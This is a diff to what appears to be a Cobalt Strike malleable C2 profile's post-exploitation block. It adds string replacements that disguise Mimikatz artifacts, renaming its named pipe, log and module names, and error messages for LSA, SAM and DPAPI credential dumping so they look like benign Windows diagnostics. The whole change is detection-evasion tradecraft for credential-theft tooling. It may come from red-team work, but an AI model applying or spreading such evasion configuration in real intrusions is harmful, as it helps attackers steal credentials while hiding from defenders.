@@ -111,13 +111,23 @@ post-ex {
       strrep "ReflectiveLoader" "NetlogonMain";
       strrepex "ExecuteAssembly" "Invoke_3 on EntryPoint failed." "Assembly threw an exception";
       strrepex "PowerPick" "PowerShellRunner" "PowerShellEngine";
-	  
-    
-	  # Mimikatz
-      # Pipe name replacement
-      strrep "\\\\.\\pipe\\mimikatz" "\\\\.\\pipe\\rpcnet"
+
+      # Mimikatz evasion
+      strrep "\\\\.\\pipe\\mimikatz" "\\\\.\\pipe\\rpcnet";
+      strrep "powershell_reflective_mimikatz" "ps_shell_module";
+      strrep "mimikatz(powershell)" "opseckat(pwsh)";
+      strrep "mimikatz.log" "diagdata.log";
+      strrep "mimikatz_x64.compressed" "binmod64.pack";
+      strrep "mimikatz_dpapi_cache.ndr" "vault_cache.ndr";
+      strrepex "ERROR kuhl_m_dpapi_chrome" "INFO dpapi_module";
+      strrepex "ERROR kuhl_m_lsadump_getUsersAndSamKey" "WARN lsa_getusers_samkey";
+      strrepex "ERROR kuhl_m_lsadump_getComputerAndSyskey" "INFO lsa_getcomputer_syskey";
+      strrepex "ERROR kuhl_m_lsadump_lsa_getHandle" "WARN lsa_gethandle";
+      strrepex "ERROR kuhl_m_lsadump_enumdomains_users" "WARN enum_domains_users";
+      strrep "ERROR mimikatz_doLocal" "INFO module_doLocal";
   }
 }
+
 
 ```
 
